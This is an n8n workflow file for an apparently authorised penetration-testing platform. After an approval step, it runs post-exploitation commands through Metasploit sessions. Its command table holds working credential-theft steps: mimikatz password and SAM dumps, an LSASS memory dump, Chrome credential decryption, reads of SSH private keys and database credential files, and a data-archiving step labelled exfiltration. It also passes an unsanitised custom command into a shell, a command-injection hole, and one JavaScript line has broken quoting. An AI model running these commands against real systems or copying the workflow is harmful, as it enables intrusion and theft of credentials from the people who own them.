id: 10
name: Post-Exploitation Workflow
active: true
settings:
  executionOrder: v1
  saveManualExecutions: true
nodes:
  - id: webhook
    name: Webhook Trigger
    type: n8n-nodes-base.webhook
    typeVersion: 1
    position:
      - 250
      - 300
    parameters:
      path: anptop/post-exploitation
      httpMethod: post
      options: {}
  - id: validate-session
    name: Validate Session
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 450
      - 300
    parameters:
      method: get
      url: >-
        http://backend:8000/api/v1/sessions/{{ $json.session_id }}/validate
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      options: {}
  - id: assess-risk
    name: Assess Post-Ex Risk
    type: n8n-nodes-base.function
    typeVersion: 1
    position:
      - 650
      - 300
    parameters:
      functionCode: |
        const request = items[0].json;
        const action = request.action_type || 'enumeration';
        
        // Risk assessment based on action type
        const actionRisk = {
          'enumeration': { level: 'low', approvers: 1, roles: ['ANALYST'], timeout: 4 },
          'credential_harvesting': { level: 'high', approvers: 2, roles: ['SENIOR_ANALYST', 'TEAM_LEAD'], timeout: 2 },
          'data_discovery': { level: 'medium', approvers: 1, roles: ['SENIOR_ANALYST'], timeout: 4 },
          'persistence_setup': { level: 'critical', approvers: 2, roles: ['TEAM_LEAD', 'CISO'], timeout: 2 },
          'privilege_escalation': { level: 'high', approvers: 2, roles: ['SENIOR_ANALYST', 'TEAM_LEAD'], timeout: 2 },
          'data_exfiltration': { level: 'critical', approvers: 2, roles: ['TEAM_LEAD', 'CISO'], timeout: 1 },
          'lateral_movement': { level: 'critical', approvers: 2, roles: ['TEAM_LEAD', 'CISO'], timeout: 2 },
          'network_discovery': { level: 'low', approvers: 1, roles: ['ANALYST'], timeout: 4 }
        };
        
        const riskConfig = actionRisk[action] || { level: 'medium', approvers: 1, roles: ['SENIOR_ANALYST'], timeout: 4 };
        
        return [{
          json: {
            ...request,
            risk_level: riskConfig.level,
            required_approvers: riskConfig.approvers,
            required_roles: riskConfig.roles,
            approval_timeout_hours: riskConfig.timeout,
            action_risk: riskConfig
          }
        }];
  - id: request-approval
    name: Request Approval
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 850
      - 300
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/approvals
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"engagement_id": {{ $json.engagement_id }}, "approval_type": "post_exploitation", "title": "Post-exploitation: {{ $json.action_name }}", "description": "Perform {{ $json.action_type }} on session {{ $json.session_id }}", "risk_level": "{{ $json.risk_level }}", "required_approvers": {{ $json.required_approvers }}, "required_roles": {{ $json.required_roles }}, "session_id": {{ $json.session_id }}}
      options: {}
  - id: wait-approval
    name: Wait for Approval
    type: n8n-nodes-base.wait
    typeVersion: 1
    position:
      - 1050
      - 300
    parameters:
      amount: "{{ $json.approval_timeout_hours || 4 }}"
      unit: hours
      resume: interval
  - id: check-status
    name: Check Status
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 1250
      - 300
    parameters:
      method: get
      url: >-
        http://backend:8000/api/v1/approvals/{{ $json.approval_id }}
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      options: {}
  - id: is-approved
    name: Is Approved
    type: n8n-nodes-base.if
    typeVersion: 1
    position:
      - 1450
      - 300
    parameters:
      conditions:
        string:
          - value1: "{{ $json.status }}"
            operation: equal
            value2: "approved"
  - id: build-command
    name: Build Post-Ex Command
    type: n8n-nodes-base.function
    typeVersion: 1
    position:
      - 1650
      - 300
    parameters:
      functionCode: |
        const request = items[0].json;
        const action = request.action_type;
        
        const commands = {
          // System enumeration
          'system_info': 'sysinfo; getuid; hostname; osinfo 2>/dev/null || uname -a',
          'user_info': 'getuid; whoami /all 2>/dev/null || whoami && id',
          'network_info': 'ipconfig /all 2>/dev/null || ip addr && netstat -ano',
          'processes': 'ps aux 2>/dev/null || tasklist /v /fo csv',
          'installed_software': 'wmic product get name,version 2>/dev/null || dpkg -l',
          'scheduled_tasks': 'schtasks /query /fo LIST 2>/dev/null || crontab -l',
          'services': 'sc query 2>/dev/null || systemctl list-units --type=service',
          
          // Credential harvesting
          'credential_harvesting': 'mimikatz sekurlsa::logonpasswords; lsadump::sam',
          'lsass_dump': 'procdump -ma lsass.exe -o /tmp/lsass.dmp; sekurlsa::minidump /tmp/lsass.dmp',
          'browser_credentials': 'mimikatz dpapi::chrome /unprotect',
          'ssh_keys': 'cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/*.pub',
          
          // Data discovery
          'file_search': 'find / -name "*.password" -o -name "*.txt" -o -name "*.xls" 2>/dev/null | head -100',
          'database_creds': 'cat /home/*/.my.cnf 2>/dev/null || cat /root/.my.cnf',
          'shares_enum': 'smbclient -L //{{ $json.target_ip }} -N 2>/dev/null',
          'sensitive_files': 'find /etc -name "*.conf" -o -name "*passwd*" 2>/dev/null | head -50',
          
          // Privilege escalation
          'priv_esc': 'whoami && whoami /priv && systeminfo',
          'kernel_exploits': 'uname -a && cat /etc/os-release',
          'sudo_rights': 'sudo -l 2>/dev/null || echo "Checking sudo..."',
          
          // Persistence
          'check_persistence': 'ls -la /etc/cron* 2>/dev/null || schtasks /query',
          
          // Data exfiltration
          'data_exfil': 'tar -czf /tmp/data.tar.gz {{ $json.target_path || '/etc' }}'
        };
        
        const command = commands[action] || request.custom_command || 'echo "No command defined"';
        
        return [{
          json: {
            ...request,
            msf_command: `msfconsole -q -x 'sessions -i ${request.session_id}; ${command}; exit'`,
            command: command,
            timeout: request.timeout || 120
          }
        }];
  - id: execute-post-ex
    name: Execute Post-Ex
    type: n8n-nodes-base.executeCommand
    typeVersion: 1
    position:
      - 1850
      - 300
    parameters:
      command: "{{ $json.msf_command }}"
      options:
        shell: true
        workingDirectory: /tmp/anptop/post-ex
        timeout: "{{ $json.timeout || 120 }}"
  - id: parse-results
    name: Parse Results
    type: n8n-nodes-base.function
    typeVersion: 1
    position:
      - 2050
      - 300
    parameters:
      functionCode: |
        const output = items[0].json.stdout || '';
        const action = items[0].json.action_type;
        
        // Extract key findings based on action type
        const findings = {
          credentials: [],
          files: [],
          users: [],
          processes: [],
          network_info: []
        };
        
        // Parse credential patterns
        const credPatterns = [
          /([a-zA-Z0-9._-]+):([a-zA-Z0-9._-]+)/g,
          /password[:\s]+([^\s\n]+)/gi,
          /Password:\s*([^\n]+)/g
        ];
        
        for (const pattern of credPatterns) {
          let match;
          while ((match = pattern.exec(output)) !== null) {
            findings.credentials.push(match[0]);
          }
        }
        
        // Parse file paths
        const filePattern = /(\/[\w\/.-]+\.(txt|conf|key|pem|crt|pfx))/g;
        let match;
        while ((match = filePattern.exec(output)) !== null) {
          findings.files.push(match[0]);
        }
        
        // Parse user information
        const userPattern = /(uid=\d+\([^\)]+\)|user[:\s]+(\w+)|User:\s*(\w+))/gi;
        while ((match = userPattern.exec(output)) !== null) {
          findings.users.push(match[0]);
        }
        
        return [{
          json: {
            ...items[0].json,
            output: output.substring(0, 10000),
            findings: findings,
            extracted_count: {
              credentials: findings.credentials.length,
              files: findings.files.length,
              users: findings.users.length
            }
          }
        }];
  - id: store-results
    name: Store Results
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 2250
      - 300
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/post-exploitation
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"engagement_id": {{ $json.engagement_id }}, "session_id": {{ $json.session_id }}, "action_type": "{{ $json.action_type }}", "action_name": "{{ $json.action_name }}", "status": "completed", "output": "{{ $json.output | replace('\"', '\\\"') }}", "findings": {{ $json.findings }}, "completed_at": "{{ $node['Execute Post-Ex'].json.completed_at }}"}
      options: {}
  - id: collect-evidence
    name: Collect Evidence
    type: n8n-nodes-base.httpRequest
    typeVersion: 1
    position:
      - 2450
      - 300
    parameters:
      method: post
      url: >-
        http://backend:8000/api/v1/webhooks/evidence-collection
      sendHeaders: true
      headerParameters:
        parameters:
          - name: Authorization
            value: Bearer {{ $env.API_TOKEN }}
      sendBody: true
      bodyParameters:
        parameters:
          - name: json
            value: >-
              {"engagement_id": {{ $json.engagement_id }}, "post_exploit_id": {{ $json.post_exploit_id }}, "host_id": {{ $json.target_host_id }}, "evidence_types": ["command_output", "findings"], "triggered_by": "post_exploitation"}
      options: {}
  - id: webhook-response
    name: Webhook Response
    type: n8n-nodes-base.webhook
    typeVersion: 1
    position:
      - 2650
      - 300
    parameters:
      respondWith: json
      jsonResponse: >-
        {"status": "completed", "action": "{{ $json.action_type }}", "credentials_found": {{ $json.findings.credentials.length }}, "execution_id": {{ $execution.id }} }
      options: {}
connections:
  Webhook Trigger:
    main:
      - - node: Validate Session
          type: main
          index: 0
  Validate Session:
    main:
      - - node: Assess Post-Ex Risk
          type: main
          index: 0
  Assess Post-Ex Risk:
    main:
      - - node: Request Approval
          type: main
          index: 0
  Request Approval:
    main:
      - - node: Wait for Approval
          type: main
          index: 0
  Wait for Approval:
    main:
      - - node: Check Status
          type: main
          index: 0
  Check Status:
    main:
      - - node: Is Approved
          type: main
          index: 0
  Is Approved:
    main:
      - - node: Build Post-Ex Command
          type: main
          index: 0
  Build Post-Ex Command:
    main:
      - - node: Execute Post-Ex
          type: main
          index: 0
  Execute Post-Ex:
    main:
      - - node: Parse Results
          type: main
          index: 0
  Parse Results:
    main:
      - - node: Store Results
          type: main
          index: 0
  Store Results:
    main:
      - - node: Collect Evidence
          type: main
          index: 0
  Collect Evidence:
    main:
      - - node: Webhook Response
          type: main
          index: 0
